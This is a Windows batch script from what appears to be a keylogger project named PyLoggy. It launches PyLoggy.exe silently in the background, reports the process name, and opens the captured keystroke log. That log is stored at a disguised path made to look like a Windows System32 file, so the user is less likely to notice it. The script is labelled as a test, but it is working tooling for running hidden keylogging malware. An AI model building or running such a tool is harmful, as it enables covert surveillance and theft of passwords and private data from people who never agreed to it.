@echo off
REM Change to project root
cd /d "%~dp0\.."

echo ========================================
echo PyLoggy Test Script
echo ========================================
echo.
echo This will run PyLoggy.exe (keylogger) for testing.
echo The process will run silently in the background.
echo.
echo Log file location: %%APPDATA%%\Microsoft\Windows\System32\SystemLog.dat
echo.
pause
echo.
echo Starting keylogger...
echo.
if exist "output\PyLoggy.exe" (
    start output\PyLoggy.exe
    echo.
    echo PyLoggy.exe is now running in the background.
    echo.
    echo IMPORTANT:
    echo - Process name: PyLoggy.exe
    echo - Log file: %%APPDATA%%\Microsoft\Windows\System32\SystemLog.dat
    echo - Check Task Manager to verify it's running
    echo.
    echo To view logs, run: scripts\view_logs.bat
    echo To stop it, run: scripts\stop.bat
    echo.
    echo Press any key to try opening the log file...
    pause >nul
    set LOG_PATH=%APPDATA%\Microsoft\Windows\System32\SystemLog.dat
    if exist "%LOG_PATH%" (
        echo Opening log file...
        notepad "%LOG_PATH%"
    ) else (
        echo Log file not created yet. Wait a few seconds and try again.
        echo Or use scripts\view_logs.bat to find it.
    )
) else (
    echo ERROR: PyLoggy.exe not found in output folder!
    echo.
    echo Please build the executable first:
    echo 1. Run scripts\build.bat
    echo 2. Then run this script again
)
echo.
pause
